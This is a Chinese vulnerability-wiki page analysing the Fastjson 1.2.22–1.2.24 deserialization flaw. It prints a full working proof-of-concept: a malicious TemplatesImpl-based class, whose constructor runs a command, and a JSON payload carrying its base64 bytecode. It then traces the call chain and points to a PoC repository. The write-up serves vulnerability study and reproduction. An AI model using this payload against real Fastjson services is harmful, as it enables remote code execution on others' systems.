<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Fastjson 1.2.22 - 1.2.24 反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Fastjson 1.2.22 - 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Fastjson%201.2.68%20bypass%20autotype/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Fastjson%201.2.68%20bypass%20autotype/" class="btn btn-xs btn-link">
        Fastjson 1.2.68 bypass autotype
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../FasterXML%20jackson/%EF%BC%88CVE-2020-8840%EF%BC%89FasterXML%20jackson-databind%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../FasterXML%20jackson/%EF%BC%88CVE-2020-8840%EF%BC%89FasterXML%20jackson-databind%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="fastjson-1222-1224">Fastjson 1.2.22 - 1.2.24 反序列化漏洞<a class="headerlink" href="#fastjson-1222-1224" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Fastjson 1.2.22-24</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="0x01">0x01 简单介绍<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h3>
<blockquote>
<p>介绍：FastJson是一款由阿里开发的JSON库&gt; 影响版本：1.2.22-24&gt; 官方通告：<a href="https://github.com/alibaba/fastjson/wiki/security">https://github.com/alibaba/fastjson/wiki/security</a>_update_20170315&gt; 补丁：<a href="https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b">https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b</a></p>
<p>本地环境：&gt; win10&gt; idea64 2018.2.5&gt; jdk 1.8&gt; fastjson 1.22</p>
</blockquote>
<h4 id="fastjson">FastJson的简单使用<a class="headerlink" href="#fastjson" title="Permanent link">&para;</a></h4>
<p>先通过一个简单的demo来熟悉一下FastJson的基本操作。首先创建一个Student类，Student.java：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">package</span><span class="w"> </span><span class="nx">ka1n4t</span><span class="p">.</span><span class="nx">test</span><span class="p">;</span>

<span class="nx">public</span><span class="w"> </span><span class="kd">class</span><span class="w"> </span><span class="nx">Student</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="nx">String</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="w">    </span><span class="k">private</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">age</span><span class="p">;</span>

<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="nx">String</span><span class="w"> </span><span class="nx">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="nx">void</span><span class="w"> </span><span class="nx">setName</span><span class="p">(</span><span class="nx">String</span><span class="w"> </span><span class="nx">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">this</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">age</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="nx">void</span><span class="w"> </span><span class="nx">setAge</span><span class="p">(</span><span class="nx">int</span><span class="w"> </span><span class="nx">age</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">this</span><span class="p">.</span><span class="nx">age</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">age</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>Students有一个公有属性name和一个私有属性age。下面使用一个测试类，将json字符串反序列化成Student对象，learnFJ.java：</p>
<div class="codehilite"><pre><span></span><code><span class="n">package</span> <span class="n">ka1n4t</span><span class="o">.</span><span class="n">test</span><span class="p">;</span>


<span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span>

<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">learnFJ</span> <span class="p">{</span>
    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span> <span class="n">args</span><span class="p">[])</span> <span class="p">{</span>
        <span class="n">String</span> <span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;{</span><span class="se">\&quot;</span><span class="s2">@type</span><span class="se">\&quot;</span><span class="s2">:</span><span class="se">\&quot;</span><span class="s2">ka1n4t.test.Student</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">name</span><span class="se">\&quot;</span><span class="s2">:</span><span class="se">\&quot;</span><span class="s2">ZhangSan</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">age</span><span class="se">\&quot;</span><span class="s2">:123}&quot;</span><span class="p">;</span>
        <span class="n">Student</span> <span class="n">obj1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="n">parseObject</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">Student</span><span class="o">.</span><span class="n">class</span><span class="p">,</span> <span class="n">Feature</span><span class="o">.</span><span class="n">SupportNonPublicField</span><span class="p">);</span>
        <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">obj1</span><span class="o">.</span><span class="n">getName</span><span class="p">());</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>结果：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<h3 id="0x02">0x02 原理分析<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h3>
<h4 id="poc">分析POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h4>
<p>先看一下用于反序列化的恶意类evilClass1.java:</p>
<div class="codehilite"><pre><span></span><code><span class="n">package</span> <span class="n">ka1n4t</span><span class="o">.</span><span class="n">poc</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>

<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">evilClass1</span> <span class="n">extends</span> <span class="n">AbstractTranslet</span><span class="o">/*</span><span class="n">ka1n4t</span><span class="o">*/</span> <span class="p">{</span>


    <span class="n">public</span> <span class="n">void</span> <span class="n">transform</span><span class="p">(</span><span class="n">DOM</span> <span class="n">document</span><span class="p">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="p">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">}</span>


    <span class="n">public</span> <span class="n">void</span> <span class="n">transform</span><span class="p">(</span><span class="n">DOM</span> <span class="n">document</span><span class="p">,</span> <span class="n">com</span><span class="o">.</span><span class="n">sun</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">serializer</span><span class="o">.</span><span class="n">SerializationHandler</span><span class="p">[]</span> <span class="n">handlers</span><span class="p">)</span> <span class="n">throws</span> <span class="n">TransletException</span> <span class="p">{</span>

    <span class="p">}</span>

    <span class="n">public</span> <span class="n">evilClass1</span><span class="p">()</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
        <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;calc&quot;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
        <span class="n">evilClass1</span> <span class="n">helloworld</span> <span class="o">=</span> <span class="n">new</span> <span class="n">evilClass1</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>其中的构造方法是用exec弹个计算器。看下poc，vulApp1.java：</p>
<div class="codehilite"><pre><span></span><code><span class="n">package</span> <span class="n">ka1n4t</span><span class="o">.</span><span class="n">poc</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.io.IOUtils</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.codec.binary.Base64</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>

<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">vulApp1</span> <span class="p">{</span>

    <span class="n">public</span> <span class="n">static</span> <span class="n">String</span> <span class="n">readClass</span><span class="p">(</span><span class="n">String</span> <span class="bp">cls</span><span class="p">){</span>
        <span class="n">ByteArrayOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">IOUtils</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="n">new</span> <span class="n">FileInputStream</span><span class="p">(</span><span class="n">new</span> <span class="n">File</span><span class="p">(</span><span class="bp">cls</span><span class="p">)),</span> <span class="n">bos</span><span class="p">);</span>
        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">IOException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="n">encodeBase64String</span><span class="p">(</span><span class="n">bos</span><span class="o">.</span><span class="n">toByteArray</span><span class="p">());</span>

        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">bad_method</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">ParserConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ParserConfig</span><span class="p">();</span>
        <span class="n">final</span> <span class="n">String</span> <span class="n">fileSeparator</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="n">getProperty</span><span class="p">(</span><span class="s2">&quot;file.separator&quot;</span><span class="p">);</span>
        <span class="n">String</span> <span class="n">evil_path</span> <span class="o">=</span> <span class="s2">&quot;D:</span><span class="se">\\</span><span class="s2">Java-App</span><span class="se">\\</span><span class="s2">fastjson-1.2.22</span><span class="se">\\</span><span class="s2">target</span><span class="se">\\</span><span class="s2">classes</span><span class="se">\\</span><span class="s2">ka1n4t</span><span class="se">\\</span><span class="s2">poc</span><span class="se">\\</span><span class="s2">evilClass1.class&quot;</span><span class="p">;</span>
        <span class="n">String</span> <span class="n">evil_code</span> <span class="o">=</span> <span class="n">readClass</span><span class="p">(</span><span class="n">evil_path</span><span class="p">);</span>

        <span class="n">final</span> <span class="n">String</span> <span class="n">NASTY_CLASS</span> <span class="o">=</span> <span class="s2">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="p">;</span>

        <span class="n">String</span> <span class="n">text1</span> <span class="o">=</span> <span class="s2">&quot;{</span><span class="se">\&quot;</span><span class="s2">@type</span><span class="se">\&quot;</span><span class="s2">:</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">NASTY_CLASS</span> <span class="o">+</span>
                <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">_bytecodes</span><span class="se">\&quot;</span><span class="s2">:[</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">+</span><span class="n">evil_code</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">],&quot;</span> <span class="o">+</span>
                <span class="s2">&quot;&#39;_name&#39;:&#39;a.b&#39;,&quot;</span> <span class="o">+</span>
                <span class="s2">&quot;&#39;_tfactory&#39;:{ },&quot;</span> <span class="o">+</span>
                <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">_outputProperties</span><span class="se">\&quot;</span><span class="s2">:{ }}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">text1</span><span class="p">);</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="n">parseObject</span><span class="p">(</span><span class="n">text1</span><span class="p">,</span> <span class="n">Object</span><span class="o">.</span><span class="n">class</span><span class="p">,</span> <span class="n">config</span><span class="p">,</span> <span class="n">Feature</span><span class="o">.</span><span class="n">SupportNonPublicField</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span> <span class="n">args</span><span class="p">[])</span> <span class="p">{</span>
        <span class="n">bad_method</span><span class="p">();</span>
    <span class="p">}</span>

<span class="p">}</span>
</code></pre></div>

<p>核心部分：</p>
<div class="codehilite"><pre><span></span><code><span class="nx">String</span><span class="w"> </span><span class="nx">text1</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;{\&quot;@type\&quot;:\&quot;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">NASTY_CLASS</span><span class="w"> </span><span class="o">+</span>
<span class="w">                </span><span class="s">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span><span class="o">+</span><span class="nx">evil_code</span><span class="o">+</span><span class="s">&quot;\&quot;],&quot;</span><span class="w"> </span><span class="o">+</span>
<span class="w">                </span><span class="s">&quot;&#39;_name&#39;:&#39;a.b&#39;,&quot;</span><span class="w"> </span><span class="o">+</span>
<span class="w">                </span><span class="s">&quot;&#39;_tfactory&#39;:{ },&quot;</span><span class="w"> </span><span class="o">+</span>
<span class="w">                </span><span class="s">&quot;\&quot;_outputProperties\&quot;:{ }}\n&quot;</span><span class="p">;</span>

<span class="nx">Object</span><span class="w"> </span><span class="nx">obj</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parseObject</span><span class="p">(</span><span class="nx">text1</span><span class="p">,</span><span class="w"> </span><span class="nx">Object</span><span class="p">.</span><span class="kd">class</span><span class="p">,</span><span class="w"> </span><span class="nx">config</span><span class="p">,</span><span class="w"> </span><span class="nx">Feature</span><span class="p">.</span><span class="nx">SupportNonPublicField</span><span class="p">);</span>
</code></pre></div>

<p>_bytecodes是经过base64编码的evilClass1的字节码文件，NASTY_CLASS是TemplatesImpl类。总结一下这个payload，利用JSON.parseObject反序列化TemplatesImpl类，其中_bytecodes属性是经过base64编码的恶意类字节码文件。</p>
<h4 id="_4">调试分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
<p>下面来分析一下反序列化TemplatesImpl的调用链，首先经过java的反射机制，到达TemplatesImpl类，调用其getOutputProperties()方法：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
<p>跟进newTransformer()方法，这个方法是用于创建一个Transformer实例。然后到达getTransletInstance()方法：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<p>getTransletInstance()方法用于创建一个translet实例，返回这个translet给newTransformer()，然后被包裹成Transformer对象。跟进一下这个方法，发现其调用了defineTransletClasses()用来加载_bytecodes中的类，接着又调用了_class[_transletIndex].newInstance()将defineTransletClasses()返回的类进行实例化：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<p>先跟进一下defineTransletClasses方法：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
<p>可以看到，使用了loader.defineClass()方法用于加载_bytecodes的内容，并将返回的类赋值给_class[i]（这里的i是0）。loader是TemplatesImpl自定义的类，跟进一下：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.png" /></p>
<p>可以看到TransletClassLoader继承了Java类加载器---ClassLoader类，跟进其defineClass方法，发现直接调用了父类ClassLoader中的方法，所以就不再跟进了。</p>
<p>回到defineTransletClasses方法，其间接调用ClassLoader加载_bytecodes中的内容之后，将加载出来的类赋值给_class[0]，然后结束，回到getTransletInstance方法，再看一下图：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId36.png" /></p>
<p>可以看到，455行直接使用了_class[0].newInstance()创建实例，创建的过程中调用了evilClass1构造方法，然后触发了payload：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId37.png" /></p>
<h3 id="0x03">0x03 复现过程<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h3>
<p>从github上直接pull下poc：<a href="https://github.com/ianxtianxt/fastjson-remote-code-execute-poc">https://github.com/ianxtianxt/fastjson-remote-code-execute-poc</a>
使用idea打开工程，编译test.java：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId39.png" /></p>
<p>然后会在target/classes/person下生成test.class文件。用同样的方法编译Poc.java。</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId40.png" /></p>
<p>配置运行方式</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId41.png" /></p>
<p>image</p>
<p>运行Poc：</p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId42.png" /></p>
<p><img alt="" src="../resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId43.png" /></p>
<h2 id="_5">参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.cnblogs.com/litlife/p/9986427.html">https://www.cnblogs.com/litlife/p/9986427.html</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Fastjson%201.2.68%20bypass%20autotype/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Fastjson%201.2.68%20bypass%20autotype/" class="btn btn-xs btn-link">
        Fastjson 1.2.68 bypass autotype
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../FasterXML%20jackson/%EF%BC%88CVE-2020-8840%EF%BC%89FasterXML%20jackson-databind%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../FasterXML%20jackson/%EF%BC%88CVE-2020-8840%EF%BC%89FasterXML%20jackson-databind%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>